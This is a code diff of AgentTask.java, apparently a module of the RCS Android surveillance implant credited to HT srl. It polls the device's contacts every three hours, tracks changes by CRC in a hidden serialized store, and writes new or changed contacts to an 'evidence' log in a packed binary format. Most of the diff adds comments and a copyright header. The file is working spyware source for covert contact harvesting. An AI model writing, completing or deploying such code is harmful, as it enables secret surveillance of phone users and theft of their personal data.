@@ -1,3 +1,12 @@
+/* *******************************************
+ * Copyright (c) 2011
+ * HT srl,   All rights reserved.
+ * Project      : RCS, RCSAndroid
+ * File         : AgentTask.java
+ * Created      : 6-mag-2011
+ * Author		: zeno
+ * *******************************************/
+
 package com.ht.RCSAndroidGUI.agent;
 
 import java.io.ByteArrayOutputStream;
@@ -32,7 +41,8 @@ public class AgentTask extends AgentBase {
 	private PickContact contact;
 
 	Markup markup;
-	HashMap<Long, Integer> contacts;
+	
+	HashMap<Long, Integer> contacts; // (contact.id, contact.pack.crc)
 
 	public AgentTask() {
 
@@ -43,6 +53,9 @@ public class AgentTask extends AgentBase {
 		return true;
 	}
 
+	/**
+	 * unserialize the contacts crc hashtable
+	 */
 	@Override
 	public void begin() {
 		setPeriod(180 * 60 * 1000);
@@ -50,6 +63,8 @@ public class AgentTask extends AgentBase {
 
 		markup = new Markup(AgentType.AGENT_TASK);
 		boolean needSerialize = false;
+		
+		// the markup exists, try to read it
 		if (markup.isMarkup()) {
 			try {
 				contacts = (HashMap<Long, Integer>) markup.readMarkupSerializable();
@@ -58,6 +73,7 @@ public class AgentTask extends AgentBase {
 			}
 		}
 
+		// if no markup available, create a new empty one
 		if (contacts == null) {
 			contacts = new HashMap<Long, Integer>();
 			serializeContacts();
@@ -65,8 +81,12 @@ public class AgentTask extends AgentBase {
 		}
 	}
 
+	/**
+	 * serialize contacts in the markup
+	 */
 	private void serializeContacts() {
 		Check.ensures(contacts != null, "null contacts");
+		
 		try {
 			markup.writeMarkupSerializable(contacts);
 		} catch (IOException e) {
@@ -74,6 +94,10 @@ public class AgentTask extends AgentBase {
 		}
 	}
 
+	/**
+	 * Every once and then read the contactInfo, and check every change.
+	 * If something is new the contact is saved.
+	 */
 	@Override
 	public void go() {
 		contact = new PickContact();
@@ -86,13 +110,16 @@ public class AgentTask extends AgentBase {
 
 		boolean needToSerialize = false;
 	
+		// for every Contact
 		while (iter.hasNext()) {
 			Contact c = iter.next();
 
+			// calculate the crc of the contact
 			byte[] packet = preparePacket(c);
 			Integer crcOld = contacts.get(c.getId());
 			Integer crcNew = crc(packet);
 
+			// if does not match, save and serialize
 			if (!crcNew.equals(crcOld)) {
 				Log.d("QZ", TAG + " (go): new contact. " + c);
 				contacts.put(c.getId(), crc(packet));
@@ -106,12 +133,21 @@ public class AgentTask extends AgentBase {
 		}
 	}
 
+	/**
+	 * Standard crc
+	 * @param packet
+	 * @return
+	 */
 	private int crc(byte[] packet) {
 		CRC32 crc = new CRC32();
 		crc.update(packet);
 		return crc.hashCode();
 	}
 
+	/**
+	 * Save evidence
+	 * @param c
+	 */
 	private void saveEvidence(Contact c) {
 
 		byte[] packet = preparePacket(c);
@@ -122,6 +158,11 @@ public class AgentTask extends AgentBase {
 		log.close();
 	}
 
+	/**
+	 * Prepare the packet from the contact
+	 * @param c
+	 * @return
+	 */
 	private byte[] preparePacket(Contact c) {
 
 		UserInfo user = c.getUserInfo();
@@ -137,12 +178,8 @@ public class AgentTask extends AgentBase {
 		final int version = 0x01000000;
 
 		final byte[] header = new byte[12];
-		// final byte[] payload = new byte[2048];
 
 		ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-
-		// final DataBuffer dbPayload = new DataBuffer(payload, 0, 2048);
-
 		String message = c.getInfo();
 
 		addTypedString(outputStream, (byte) 0x01, name);
@@ -158,7 +195,6 @@ public class AgentTask extends AgentBase {
 		final int size = payload.length + header.length;
 
 		// a questo punto il payload e' pronto
-
 		final DataBuffer db_header = new DataBuffer(header, 0, size);
 		db_header.writeInt(size);
 		db_header.writeInt(version);
